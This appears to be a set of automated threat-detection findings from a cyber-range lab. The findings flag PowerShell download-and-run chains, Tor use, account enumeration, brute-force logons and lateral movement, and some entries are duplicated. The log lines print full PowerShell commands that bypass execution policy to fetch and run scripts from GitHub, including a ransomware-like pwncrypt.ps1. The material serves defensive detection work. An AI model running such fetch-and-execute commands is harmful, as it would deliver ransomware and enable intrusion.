title: Encoded PowerShell Command Detected
description: Encoded PowerShell commands were executed, likely to obfuscate the true intent. The command involves environment, OS version, and information about signatures.

mitre.description: Adversaries may employ various techniques to obscure the true purpose of their code, such as using encoded PowerShell commands.

notes: The commands appear to retrieve environment and OS information, indicating a possible reconnaissance activity.

title: Potentially Suspicious Linux Processes
description: Frequent execution of common Linux commands like uname, cat, grep, and systemctl under the root account in a short timeframe suggests possible environment reconnaissance or automation scripts.

mitre.description: Adversaries may attempt to get information about the operating system and hardware.

notes: While these commands are typically benign, their frequency and use of the root account might warrant further investigation.

title: Potential Data Collection and Exfiltration
description: Suspicious activity related to data collection, including the use of MpCmdRun to perform operations related to Windows Defender tasks. This could suggest information gathering and exfiltration.

mitre.description: Adversaries may search local file systems and select specific files for exfiltration.

notes: The continued use of MpCmdRun for collecting files from the local system could indicate preparation for data exfiltration.

title: Unsanctioned Software Download and Silent Install via PowerShell
description: A PowerShell command was used to invoke a web request to download an executable (7z2408-x64.exe) from https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe and then install it silently using /S. This is not a typical method for administrator-sanctioned software deployment on enterprise assets, and the use of -ExecutionPolicy Bypass and -NoProfile flags can be used to evade some protections and logging.

mitre.description: Adversaries may abuse PowerShell commands and scripts for execution of malicious payloads.

log_lines: 2025-07-30 05:48:03.294059+00:00,windows-team-ke,krogers2023,windows-team-ke,powershell.exe,"powershell.exe  -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process C:\programdata\7z2408-x64.exe -ArgumentList /S -Wait"","cmd.exe  /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process C:\programdata\7z2408-x64.exe -ArgumentList /S -Wait"
notes: Software deployed this way may bypass standard IT approval and software control processes. This pattern is often indicative of user-initiated or script/download attack chains. The blob storage location is especially notable.

title: Frequent Use of Tor Browser Detected
description: Multiple instances of firefox.exe and tor.exe are being executed from the Tor Browser directory by user varshitha. This indicates the Tor Browser is in use and actively launching multiple child processes. Tor is commonly used to anonymize internet traffic and access the dark web, which can sometimes be associated with risky or suspicious activities. However, it can also be used for legitimate privacy reasons. The logs do not show additional process behavior indicating malware, but the routine and volume of Tor-related activity stands out and could be a sign of circumvention, possible data exfiltration, or other attempts to evade detection.

mitre.description: Adversaries may use multi-hop proxy services (such as Tor) to hide command and control traffic and evade detection.

notes: While Tor usage is not inherently malicious, widespread automated or unapproved usage on enterprise infrastructure, particularly on a server or admin machine, should be reviewed according to company policy.

title: Repetitive Execution of net.exe and net1.exe for Account Enumeration
description: A highly repetitive pattern of net.exe accounts and net1.exe accounts is observed in rapid succession (dozens of times in the span of approximately one minute). This may indicate automated enumeration or abnormal script activity, which can be linked to reconnaissance or attacker attempts to gather user or account data, especially when not attributed to a known admin activity or IT script.

mitre.description: Adversaries may attempt to get a list of local system accounts for later use in brute force, social engineering, or privilege escalation.

log_lines: ... (repeats for many lines, up to at least 03:43:00Z)
notes: If this is not a scheduled admin task or a known monitoring script, review the full context and scheduling. Attackers often enumerate accounts for privilege escalation or lateral movement.

title: Clustered Use of auditpol.exe for Security Policy Enumeration
description: Multiple executions of auditpol.exe with the /get /subcategory:GUID argument over numerous different subcategories within seconds. While auditpol.exe is a legitimate tool, clustered queries across many auditing categories (not seen as part of normal baseline admin scripts) may indicate an attacker trying to determine what actions are being logged for evasion planning.

mitre.sub_technique: Account, Object, and Policy Audit Policy Discovery
mitre.description: Adversaries may attempt to access detailed auditing policy settings to determine what actions are audited.

notes: If this is from a security baseline script, it may be benign—but the clustering and diversity of subkeys suggests possible adversary discovery.

title: Frequent Execution of System Diagnostic and Task Utilities Possibly Abused for Persistence or Lateral Movement
description: There are repeated invocations of taskhostw.exe with various arguments (KEYROAMING, Install $(Arg0), etc.), as well as repeated use of USOClient, MoUsoCoreWorker, and related executables. While these may be benign if this is a golden image or part of normal automated patching, in the context of the other reconnaissance activity, high-volume use may indicate abuse of native Windows tools for persistence or lateral movement.

mitre.technique: Abuse of Task Scheduling and System Processes
mitre.description: Adversaries may abuse Windows task scheduling or native system processes to maintain persistence or execute arbitrary code at system boot/logon.

notes: Taskhostw.exe executes DLLs registered as Windows Services. High-frequency/variant usage justifies closer review if not from an approved deployment or change event.

description: A highly repetitive pattern of net.exe accounts and net1.exe accounts is observed in rapid succession (dozens of times in the span of approximately one minute). This may indicate automated enumeration or abnormal script activity, which can be linked to reconnaissance or attacker attempts to gather user or account data, especially when not attributed to a known admin activity or IT script.

mitre.description: Adversaries may attempt to get a list of local system accounts for later use in brute force, social engineering, or privilege escalation.

log_lines: ... (repeats for many lines, up to at least 03:43:00Z)
notes: If this is not a scheduled admin task or a known monitoring script, review the full context and scheduling. Attackers often enumerate accounts for privilege escalation or lateral movement.

title: Clustered Use of auditpol.exe for Security Policy Enumeration
description: Multiple executions of auditpol.exe with the /get /subcategory:GUID argument over numerous different subcategories within seconds. While auditpol.exe is a legitimate tool, clustered queries across many auditing categories (not seen as part of normal baseline admin scripts) may indicate an attacker trying to determine what actions are being logged for evasion planning.

mitre.sub_technique: Account, Object, and Policy Audit Policy Discovery
mitre.description: Adversaries may attempt to access detailed auditing policy settings to determine what actions are audited.

notes: If this is from a security baseline script, it may be benign—but the clustering and diversity of subkeys suggests possible adversary discovery.

title: Frequent Execution of System Diagnostic and Task Utilities Possibly Abused for Persistence or Lateral Movement
description: There are repeated invocations of taskhostw.exe with various arguments (KEYROAMING, Install $(Arg0), etc.), as well as repeated use of USOClient, MoUsoCoreWorker, and related executables. While these may be benign if this is a golden image or part of normal automated patching, in the context of the other reconnaissance activity, high-volume use may indicate abuse of native Windows tools for persistence or lateral movement.

mitre.technique: Abuse of Task Scheduling and System Processes
mitre.description: Adversaries may abuse Windows task scheduling or native system processes to maintain persistence or execute arbitrary code at system boot/logon.

notes: Taskhostw.exe executes DLLs registered as Windows Services. High-frequency/variant usage justifies closer review if not from an approved deployment or change event.

title: Frequent Use of Tor Browser Detected
description: Multiple instances of firefox.exe and tor.exe are being executed from the Tor Browser directory by user varshitha. This indicates the Tor Browser is in use and actively launching multiple child processes. Tor is commonly used to anonymize internet traffic and access the dark web, which can sometimes be associated with risky or suspicious activities. However, it can also be used for legitimate privacy reasons. The logs do not show additional process behavior indicating malware, but the routine and volume of Tor-related activity stands out and could be a sign of circumvention, possible data exfiltration, or other attempts to evade detection.

mitre.description: Adversaries may use multi-hop proxy services (such as Tor) to hide command and control traffic and evade detection.

notes: While Tor usage is not inherently malicious, widespread automated or unapproved usage on enterprise infrastructure, particularly on a server or admin machine, should be reviewed according to company policy.

title: Unusual Audit Policy Enumeration via auditpol.exe with PowerShell Parent
description: Multiple executions of auditpol.exe with the /get argument targeting various subcategories were observed, with the parent process being a long and complex PowerShell command running out of ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection. While audit policy enumeration is legitimate in some admin/security operations (such as investigations or red team operations), the combination of extensive subcategory probing and automated PowerShell orchestration suggests enumeration at a higher than normal frequency, possibly for reconnaissance. This activity could be associated with MITRE ATT&CK technique T1007 (System Service Discovery) or T1016 (System Network Configuration Discovery). There is no indication the auditor made changes, but the large number of queries nearly simultaneously is noteworthy.

mitre.description: Adversaries may attempt to get information about system services to facilitate later privilege escalation or defense evasion.

notes: This may be benign during an active investigation or IR session, but should be reviewed for context and necessity. Automated or scripted enumeration of audit subcategories at this breadth could point to external interest in logging configuration, potentially in preparation for log tampering or discovery of detection gaps.

title: High-Frequency Account Information Querying via net.exe/net1.exe with Automated PowerShell Parent
description: A large number of net.exe and net1.exe invocations with the accounts argument occurred in rapid succession, each with a PowerShell parent referencing a script in the Windows Defender Advanced Threat Protection DataCollection directory. While legitimate (for admin inventory or incident response), enumeration at this pace, breadth, and apparent automation is atypical. This may indicate account reconnaissance activity for discovery of privilege levels or user enumeration.

mitre.description: Adversaries may attempt to get a list of local system accounts to identify privilege escalation opportunities or defense evasion methods.

notes: Heavy automated enumeration of accounts is expected in some security/IR operations but can also be a precursor to credential or privilege escalation attacks. The motivation and role of the orchestration PowerShell should be confirmed.

title: Automated PowerShell-Scripted System Enumeration Involving Compilers and .ps1 Scripts
description: The logs demonstrate a pattern where PowerShell scripts (with all-signed policy) are being executed from C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\, checked for an expected hash, and then executed. These PowerShell invocations are frequently being invoked in succession, sometimes through intermediate processes (csc.exe, cvtres.exe, conhost.exe). This operational pattern matches EDR/IR tool behavior, such as Defender for Endpoints live response system, but could also be abused by an attacker with access to such tooling or those mimicking IR activity to blend in. No indications of malicious payload were observed, but a review should confirm the origin and legitimacy of those .ps1 scripts.

mitre.description: Adversaries may abuse PowerShell commands and scripts to execute arbitrary code and commands.

notes: This is most likely benign and associated with Defender for Endpoints scripted live IR/investigation activity. If investigations or security staff are currently working on this host, this is normal; otherwise, review for abuse by adversaries who have gained sufficient privileges.

title: Malicious Powershell Script Execution: Download and Invoke Exfiltration Script
description: Multiple suspicious Powershell executions were observed downloading a script exfiltratedata.ps1 from a public GitHub repository and subsequently executing it. The downloaded script was then used to archive a potentially sensitive CSV file using 7z.exe. This behavior is strongly associated with data exfiltration attempts.

mitre.description: Exfiltration Over Web Service: Adversaries may exfiltrate data by uploading it to a web service or cloud service. In this case, use of scripting to zip data for exfiltration is observed.

title: Use of Tor Browser and tor.exe Detected
description: The logs show multiple instances of firefox.exe launching from the users Desktop\Tor Browser directory, as well as tor.exe itself, with was started with a configuration appropriate for Tor Browser. This indicates that the Tor network was being used for anonymized browsing or communications in the given window. Tor is sometimes used for legitimate privacy reasons, but is also frequently used to hide command-and-control (C2) traffic or exfiltration due to its anonymity properties.

mitre.description: Adversaries may use multi-hop proxies such as Tor or I2P to hide the true origin or destination of C2 traffic.

log_lines: ... (several additional firefox.exe instances running as Tor Browser content processes) ...
notes: No explicit evidence of malware or data exfiltration, but Tor use should be monitored for C2 or data egress, especially if not normal for this device/user.

title: Suspicious PowerShell and Data Exfiltration Activity Detected
description: Multiple instances of PowerShell being launched with -ExecutionPolicy Bypass and scripts being downloaded from an external GitHub repository, including exfiltratedata.ps1, portscan.ps1, and pwncrypt.ps1. mitre.description: Adversaries may stage data for exfiltration using scripts and publicly-available tools.

notes: URL/source should be blocked; check for any active network connections or evidence of successful exfiltration.

title: Suspicious Use of 7z and Creation of Data Archives
description: The logs show repeated use of 7z.exe and 7z2408-x64.exe (likely an installer) to compress CSV files such as employee-data-temp20250730085019.csv into archive files, immediately after execution of a suspicious exfiltration script, suggesting potential data theft.

mitre.description: Adversaries may compress collected data using utilities prior to exfiltration.

notes: The timing of these 7z invocations directly after running exfiltration scripts is strong evidence of malicious data collection.

title: Suspicious Cloud Instance Metadata Recon Activity
description: Multiple processes, including PowerShell and cmd.exe, access external IP 168.63.129.16 to query Azure instance metadata endpoints (e.g., /metadata/latest/InstanceInfo). This is frequently observed during attacker cloud reconnaissance aiming to retrieve sensitive instance information (credentials, config, etc.).

mitre.description: Adversaries may attempt to collect information about cloud resources and services.

notes: Metadata endpoint access rarely occurs in normal workloads except by agents/config tools—not directly by user PowerShell or cmd.exe. This suggests attacker reconnaissance.

title: Execution of Multiple Unrestricted PowerShell Scripts Arbitrarily Named scriptXX.ps1
description: There are several process creation events where PowerShell is launched with -ExecutionPolicy Unrestricted and runs files named script29.ps1, script30.ps1, etc. via cmd.exe. These scripts could be part of malicious automation, persistence, or attacker tooling with arbitrary file names.

mitre.description: Abuse of PowerShell for arbitrary script execution.

notes: These may be part of the attackers toolset. Validate file origins and scan for known threats.

title: EICAR Test File Payload Download and Execution
description: The logs show that the file eicar.ps1 was downloaded from an external host using PowerShell Invoke-WebRequest and executed with ExecutionPolicy Bypass. This is a well-known anti-malware test file but its use in a production system, especially outside a controlled test context, can be suspicious and potentially reflect anti-virus evasion or testing by an unauthorized entity. The parent process was cmd.exe, which spawned PowerShell with unrestricted execution policy.

mitre.description: Adversaries may abuse PowerShell commands and scripts for execution of malicious payloads.

notes: EICAR is a benign test file, but its unauthorized or unexplained execution should be reviewed.

title: Download and Execution of Port Scanning Script via PowerShell
description: Multiple instances of PowerShell are observed downloading and executing a script named portscan.ps1 from an external GitHub repository (https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1). This script is then executed on the host. This sequence is a typical precursor to internal reconnaissance and lateral movement, as attackers often scan for network ports to identify additional targets.

mitre.description: Adversaries may attempt to get a listing of services running on remote hosts to aid in follow-on exploitation or lateral movement.

title: Suspicious Enumeration of Local Accounts and Privilege-Related Activity

notes: Rapid-fire repetitive use hints at automation or script-based reconnaissance.

title: Suspicious Use of PowerShell Encoded Commands (Potential Defense Evasion)
description: There are multiple invocations of PowerShell using -encodedCommand with base64-encoded payload in noninteractive mode. While this technique can have legitimate uses within enterprise automation, it is also a common technique for hiding malicious code from standard logging.

mitre.description: Adversaries may encode data and commands to avoid detection and hinder analysis.

notes: This technique is legitimate in configuration management and monitoring, but in context with other attack activity, adds to defense evasion suspicion.

description: There is evidence of numerous failed login attempts to various accounts on the host windows-target-1 from a wide variety of external IP addresses over a short time window. The accounts targeted include default and high-value accounts such as administrator, admin, user, and several service accounts (fortigate, sqlserver, azureuser, etc). Many different remote IPs were used, which is indicative of a distributed brute-force attack. Many login names match common administrative, service, or default account names, consistent with password spraying or automated brute-force tools. The density and variety of failures in the last day is well above normal baseline, strongly suggesting active malicious activity.

mitre.description: Adversaries may use brute force techniques to attempt to gain access to accounts by guessing the password. Password spraying is a variant where the attacker tries a small set of commonly used passwords against many accounts.

notes: Numerous failed logins against administrator/service accounts from a broad and international set of IPs likely indicate scanning and brute-force automation. None of the login attempts succeeded, but this is consistent with ongoing attack activity and indicates elevated risk. Consider network controls (IP blocking, geofencing), further investigation for potential account lockouts, and monitoring for eventual successful logons.

title: Multiple RDP Brute-force Attack Attempts from External IPs
description: There are numerous failed logon attempts to jimmie-mde-test from a variety of external IP addresses. These use a diverse set of user accounts (admin, administrator, local-account variants, and many others) and often note mstsc.exe or similar RDP context. This activity is consistent with automated brute-force attacks targeting RDP. These attempts appear to originate from a wide range of global IPs, some of which are known hosting providers. The frequency, diversity of usernames, and use of common administrator accounts are hallmarks of credential stuffing or brute-force attacks.

mitre.description: Adversaries may attempt to gain access to accounts by guessing or bruteforcing passwords for known accounts, including administrator users, via RDP or similar protocols.

log_lines: ... (hundreds more lines follow using similar patterns, accounts, remote IPs, and mstsc.exe RDP context)
notes: Activity is very widespread and persistent. If RDP is exposed to the internet, highly recommend enabling network-level authentication, strong passwords, account lockout policies, and considering geo-blocking or VPN-only access.

title: Suspicious RDP Logon Success from 72.208.186.94 and Interactive Sessions
description: The account jhardy41 shows several successful logons from the external IP 72.208.186.94, in patterns strongly resembling interactive RDP sessions, including related session markers with jimmie. The logons are interleaved with many brute-force failures, but jhardy41 is consistently able to log in, often with the RDP context mstsc.exe and RemoteDeviceName filled. This could indicate this account is externally accessible—potentially exposed credentials after being discovered or guessed.

mitre.description: Adversaries may obtain legitimate account credentials and use Remote Desktop Protocol (RDP) to access a victim machine remotely.

notes: While jhardy41 may be a legitimate remote user (possibly via VPN or remote workforce), the timing with brute-force attacks is suspicious. Recommend reviewing account activity, authentication logs for signs of compromise (including geolocation and MFA), and confirming user intent.

title: Unusual Volume and Frequency of Remote Logons Between Labuser, 10.0.0.8, and 10.0.8.7/vm000003
description: The logs demonstrate an abnormally high number of LogonSuccess events for the labuser account, alternating between the same two remote IPs (10.0.0.8 and 10.0.8.7) and device names (such as local-scan-engi and vm000003) in rapid succession. These events often appear within split seconds of each other. This pattern suggests the possibility of automated activity such as the use of RDP, a scripted attack, or an account being misused via a schedule or malware. The pattern is not consistent with typical interactive user behavior and could indicate credential compromise or lateral movement within the environment.

mitre.description: Adversaries may use Valid Accounts to access Remote Desktop Protocol (RDP) and move laterally within the environment.

notes: These logons could indicate the use of valid credentials for unauthorized lateral movement, potentially with automated or remote means. Verify if these logons are expected administrative behavior. If not, treat as likely unauthorized access. Review endpoint process/command/activity logs around these times for further evidence of compromise.

title: Suspicious Repeated RDP/Network Logons with LogonSuccess every few seconds/minutes over a Prolonged Period
description: There are hundreds of consecutive successful logon events for labuser from 10.0.0.8/local-scan-engi at very short intervals (even multiple per second). This is highly irregular for genuine human usage and may suggest automated scripts/tools, a persistence mechanism, or attacker activity such as automated resource enumeration, brute-force tools, or lateral pivoting tools using RDP/SMB. The repetition (especially the logon/logoff cycle pattern) could also indicate the use of malware that maintains persistence via repeated logons.

mitre.description: Adversaries may use valid local accounts to maintain persistence, frequently logging in/out to preserve access or conduct automated activities.

notes: Cross-reference with host and process logs for the presence of scheduled tasks, services, automated scripts, or signs of malware. If not expected by environment design, treat as active compromise.

title: Evidence of Brute-Force or Credential Stuffing Attempts on Multiple Hosts
description: The logs contain multiple instances where the user labuser has repeated LogonAttempted or LogonFailed events (especially on 10.0.8.7 and 10.0.8.8), usually preceding immediate LogonSuccess or further attempts. This pattern matches common brute-forcing or credential stuffing attacks and may indicate a compromised account or attacker actively seeking valid credentials on multiple systems.

mitre.description: Adversaries may attempt to brute force passwords to gain unauthorized access to accounts and systems.

notes: Check authentication logs for the volume and timing of failures. Investigate if these are associated with legitimate password resets or attempted attacks. Review if any attackers leveraged eventual LogonSuccess events to progress deeper into the environment.

title: Evidence of Lateral Movement and Multi-Host Connections
description: There are frequent transitions in logon events from labuser across multiple hosts (10.0.0.8, 10.0.8.7, 10.0.8.5), including successful logons into different named systems (e.g., local-scan-engi, vm000003). The frequency and breadth suggest active movement across the network using the same account—consistent with lateral movement techniques after initial compromise.

mitre.description: Adversaries may use compromised credentials to access remote systems over a network.

recommendations: review hosts for signs of persistence or further C2
notes: Look for shared use of credentials across systems in short time windows and for associated process execution. Consider whether the same user is reusing credentials for remote administrative sessions in an unexpected way.

title: Repeated Unusual Logon Patterns to labuser from 10.0.8.7 & 10.0.8.8
description: There are repeated LogonSuccess and LogonAttempted events by labuser from remote IPs 10.0.8.7 (vm000003) and 10.0.8.8 (vm000004), interspersed with LogonFailed attempts, which could indicate brute-force attempts, password guessing, or scripted/automated logon attempts in close succession. These attempts are not typical for standard user behavior, particularly as they occur outside the usual local-scan-engi source pattern. The bursty pairing of LogonAttempted/LogonSuccess events is found throughout the log timeline.

mitre.description: Adversaries may use brute force techniques to try to gain access to accounts with guessed or known credentials.

notes: The pattern of LogonFailed immediately followed by LogonSuccess for the same user may indicate successful guessing of credentials. The repeated source IPs and automation-like pattern further suggest investigation is warranted. No password reset events seen in this log slice.

title: Sustained and Repeated Brute Force Attack Attempts on Root and System Accounts
description: The logs show a high volume of failed logon attempts for the root and other system accounts (e.g., backup, proxy, www-data, daemon) from a wide variety of remote IP addresses, many of which are rapidly repeated and target the same privileged account (root). This is consistent with active brute-force or password spraying attacks targeting SSH or similar remote access services. This activity is a strong precursor to unauthorized access if a weak or default password exists.

mitre.description: Adversaries may use brute force techniques to gain access to accounts.

indicators_of_compromise: Multiple source IPs such as 80.94.95.15, 20.255.62.58, 8.210.21.103, etc.
notes: This volume and diversity of failed root login attempts is usually automated. It is extremely important to review SSH configuration, enforce strong/unique passwords, and consider disabling root remote login if not strictly needed. Failure rates appear high, but success events must be scrutinized.

title: High Frequency of Successful Root Logins with Ambiguous Source
description: Throughout the entire log window, there are successful logins for the root account almost every 10 minutes or less, but the RemoteIP field is empty for these events. This could be due to local cron jobs, legitimate administrative access, or, if not expected, a compromised device running scheduled actions as root. The pattern and frequency are far higher than usual for interactive administration and should be validated against business-as-usual (e.g., cron jobs, backups). If not expected, this could indicate attacker persistence or automated access following a brute-force success.

mitre.description: Adversaries may maintain persistence using compromised or built-in accounts.

indicators_of_compromise: None (requires validation of roots expected interactive/scheduled activity)
notes: If these root logins are not due to known scheduled jobs or automation, this may represent attacker persistence. Investigate for corresponding cron/anacron jobs, scripts, or unauthorized accounts.

title: Execution of Downloaded Potential Malware Script (pwncrypt.ps1)
description: There is a sequence in which powershell.exe is used to download a script from an external source (https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1) and then execute it from C:\programdata\pwncrypt.ps1. The naming of the script, pwncrypt, could indicate ransomware or other malicious activity. This sequence matches common malware delivery and execution patterns.

mitre.description: Adversaries may abuse PowerShell commands and scripts for execution.

log_lines: 2025-07-31 00:13:23.908745+00:00,nt authority,system,ProcessCreated,windows-target-1,powershell.exe,"\"cmd.exe\" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
recommendations: check for signs of ransomware or data encryption
notes: Further review of the downloaded script is essential to confirm its intent. The context shows attempted execution immediately after download, matching malware TTPs.

title: Execution of Downloaded Potential Malware Script (eicar.ps1)
description: A script named eicar.ps1 is fetched from the same external source using PowerShell and executed. The name eicar is commonly used for test malware, but its presence and execution from an Internet location is unusual and should be examined. This sequence may represent a security test or an unsupported activity.

mitre.description: Adversaries may abuse PowerShell commands and scripts for execution.

title: Execution of Downloaded Potential Malware Script (portscan.ps1)

mitre.description: Adversaries may attempt to get a listing of services running on remote hosts via network scanning.

title: Abnormal Repeated Use of net.exe accounts by SYSTEM Account
description: Numerous rapid, repeated executions of net.exe accounts from SYSTEM using net1.exe, possibly for account enumeration. This could indicate an automated script or malware enumerating user/account policies for further activity such as privilege escalation or credential theft.

mitre.description: Adversaries may attempt to get a list of accounts on a system.

recommendations: Review process tree to determine parent process and context
Check whether repeated enumeration is legitimate (e.g., inventory/monitoring tool)
If not justified, investigate for malware or script-based enumeration
Monitor for further discovery or privilege escalation activity
notes: Such rapid, repeated executions are abnormal and may indicate automated or unauthorized account enumeration.

title: Automated PowerShell and CMD Chains Executing Arbitrary Scripts
description: Multiple instances of cmd.exe spawning powershell.exe with -ExecutionPolicy Bypass or Unrestricted to run downloaded scripts (including eicar.ps1, pwncrypt.ps1, portscan.ps1, script23.ps1, script24.ps1, etc.). Legitimate automation may do this, but its commonly observed in lateral movement, red-teaming, or malware delivery.

mitre.description: Adversaries may abuse PowerShell commands and scripts for execution.

recommendations: Investigate the sources, content, and scheduling of these script chains
Determine if this is a result of red teaming or malware delivery
Monitor for persistence or privilege escalation attempts
notes: Such chaining, especially with "Bypass" on ExecutionPolicy, is highly suspect unless in a controlled test.

title: Execution and Download of Potentially Malicious PowerShell Scripts (eicar.ps1, pwncrypt.ps1, portscan.ps1)
description: Multiple instances show the system executing PowerShell with Bypass or Unrestricted execution policy to download (Invoke-WebRequest) and run scripts such as eicar.ps1, pwncrypt.ps1, and portscan.ps1 from the URL https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/. EICAR is a known anti-malware test file; however, pwncrypt.ps1 and portscan.ps1 are suspicious. pwncrypt implies ransomware, and portscan is indicative of internal reconnaissance. The use of ExecutionPolicy Bypass is further troubling as it intentionally disables script-blocking protections.

mitre.sub_technique: PowerShell (T1059.001), Ingress Tool Transfer (T1105), System Information Discovery (T1082)
mitre.description: Adversaries may abuse PowerShell for execution, file transfer, and discovery; these methods are staples in post-compromise activity.

title: Abnormal Use of net.exe/net1.exe for accounts Query (Reconnaissance/Enumeration)
description: Frequent and repetitive execution of net.exe accounts and net1.exe accounts was observed, often as SYSTEM, without typical interactive user context. This command is frequently used by attackers and tools to assess local password/account policy, supporting password spraying and brute-force operations, or to confirm if local accounts have been recently changed. The repeated invocation (sometimes within seconds) is highly unusual in legitimate automation and is a hallmark of automated recon/reconnaissance scripts.

mitre.description: Adversaries may attempt to get a list of local accounts or accounts in groups in order to identify potential targets.

notes: This pattern of usage is textbook behavior for automated attack scripts testing password policies or prepping for user/password attacks. Pivot to associated process tree, parent command-line, and user context. Examine whether part of authorized system management or related to observed pwncrypt/portscan campaigns above.

title: Execution of Potential Ransomware Script (pwncrypt.ps1) and Possible Simulated Malware (EICAR)
description: Observed direct execution of pwncrypt.ps1 via PowerShell with bypassed protection, and eicar.ps1 in ProgramData. While eicar.ps1 is likely a benign antivirus test, pwncrypt.ps1 is highly likely to be custom or simulated ransomware, given its name. Downloaded from a public raw GitHub source. Rapid sequence of events (download, execute) increases suspicion.

mitre.technique: Command and Scripting Interpreter: PowerShell, Data Encrypted for Impact
mitre.description: PowerShell abused for script execution and T1486 refers to ransomware behavior (encrypting data for impact).

notes: Immediate containment and review recommended; even if test/simulated, may have left files or artifacts. Investigate for evidence of file encryption or dropped ransom notes. Also, check endpoint protection efficacy for future similar activity.

title: Execution and Downloading of portscan.ps1 (Network Reconnaissance)
description: Automated download and execution of a PowerShell script named portscan.ps1, which is most likely used for scanning internal/external network ports. This is a common reconnaissance technique performed by attackers post-compromise to find open services and map a network for lateral movement.

mitre.description: Adversaries may attempt to get a listing of services running on remote hosts, which may help them determine their next target.

notes: Review firewall logs and network traffic for scanning behavior. Identify which hosts were targeted. Map out if any lateral movement was successful or attempted.

title: Potential Automated or Orchestrated Malicious Activity via Automation/RunCommandExtension
description: Frequent use of automation-related binaries and commands (RunCommandExtension.exe, cmd.exe calling PowerShell scripts with Unrestricted/Bypass policy, under SYSTEM context) strongly suggests activities orchestrated by automation, red-team, or attacker scripts. The sequential and repetitive invocation pattern, immediately followed by suspicious PowerShell operations, reflects a technique to automate post-exploitation tasks at scale.

mitre.description: Attackers may use system automation/orchestration frameworks to establish persistence and schedule their tools to run, using SYSTEM privileges and validated accounts.

notes: Could be authorized automation (e.g., Azure automation, MDE sensor scripts), but close tie to malicious PowerShell downloads/execution increases suspicion. Check whether these automation tasks and scripts are expected for the environment.

title: Port scanning activity detected via PowerShell script execution
description: At 2025-07-30 20:37:08 and 2025-07-30 20:37:12, PowerShell scripts named portscan.ps1 were downloaded from a public GitHub repository and executed. The use of a script explicitly named portscan.ps1 and its execution via PowerShell suggests reconnaissance activity, potentially for identifying open ports/services for lateral movement or further exploitation.

mitre.description: Adversaries may execute port scanning to determine available services on remote hosts and networked systems.

notes: Downloading and executing portscan.ps1 via PowerShell is strongly associated with network reconnaissance. Confirm business need or investigate for malicious intent.

The script name and method of acquisition strongly suggest the script could be related to ransomware or cryptomining, representing a significant threat.

mitre.description: Adversaries may abuse PowerShell commands and scripts for execution of malicious code.

notes: Script name pwncrypt.ps1 strongly indicates potential ransomware or cryptominer. Immediate response is warranted. Confirm if this activity is part of a red team exercise or validate with the user if this matches any legitimate activity.

title: Download and execution of EICAR-like PowerShell script eicar.ps1 - potential malware simulation or test
description: The logs include multiple entries of the eicar.ps1 script being downloaded from a public GitHub repository and executed via PowerShell with bypassed execution policy. EICAR is often used as a benign test string, but execution via PowerShell with bypassed policies, especially from a public location, can indicate either malware simulation or an adversary performing defense evasion/testing techniques.

mitre.description: Adversaries may use PowerShell to execute code, often disabling or bypassing script execution policies.

notes: This activity may reflect malware simulation tool activity or security testing; confirm if this aligns with expected behavior or red team exercises.

title: High volume of net1.exe accounts executions - possible enumeration or scripting activity
description: Numerous executions of net1.exe accounts were observed within a short period (e.g., 10 invocations between 02:47:37 and 02:48:18). This is indicative of local account enumeration, which could be part of normal scripting or indicative of adversarial account reconnaissance.

mitre.description: Adversaries may attempt to get a list of local system accounts to facilitate further attacks.

notes: Repetitive account enumeration is often used in scripts, automation, or by attackers. If not consistent with administration or automation, investigate for lateral movement or data collection.

title: Use of PowerShell for registry and ShellBag analysis - possible defense evasion or system inspection
description: A PowerShell script was executed that programmatically accessed and analyzed ShellBag registry entries to inspect or manipulate user environment storage data. Such scripts are often used in forensics or by attackers to enumerate user behaviors, identify sensitive paths, or forensically erase traces.

mitre.description: Adversaries may attempt to get detailed information about the operating system and configuration.

notes: Registry/ShellBag analysis can be legitimate but is sometimes used for attacker situational awareness.

title: Remote Brute Force Attempts via RDP From Multiple External IP Addresses
description: There are numerous failed logon attempts targeting a variety of usernames, from several different foreign IP addresses (e.g., 91.206.15.14, 92.42.15.151, 5.35.3.237, etc.). The failed attempts use common usernames such as administrator, user01, rdp, admin, peter, scanuser, and more. This is a classic brute force pattern, often preceding successful intrusions if a valid credential is found.

mitre.description: Adversaries may use brute force techniques to attempt to gain access to accounts.

notes: The diversity and persistence of attempts strongly indicate automated attack infrastructure targeting RDP service. Immediate action to restrict RDP access is recommended if not strictly necessary.

title: Suspicious RDP Logins With Valid Credentials from External IP
description: Multiple successful logon events for the rafi03 account from external IP address 203.31.169.39 are observed. These logins are intermixed with failed attempts and follow the brute force attempts, suggesting the adversary may have successfully guessed the credentials. The activity is highly suspicious if rafi03 is not expected to log in remotely from that location.

mitre.description: Adversaries may leverage valid accounts to log into a system via remote desktop protocol (RDP).

notes: If this is not a known VPN or trusted endpoint for rafi03, these logins are likely unauthorized. This strongly suggests the brute force succeeded and credentials have been compromised.

title: Possible Lateral Movement via RDP to desktop-i9v7lj4 from External Address
description: There are successful RDP logins for rafi03 from 203.31.169.39 to host desktop-i9v7lj4. This may indicate lateral movement after an initial compromise, with the attacker using RDP to access additional hosts on the internal network.

mitre.description: Adversaries may use valid accounts and RDP to move laterally between systems.

notes: Review session records, user actions on target, and check for additional affected hosts for potential spread.

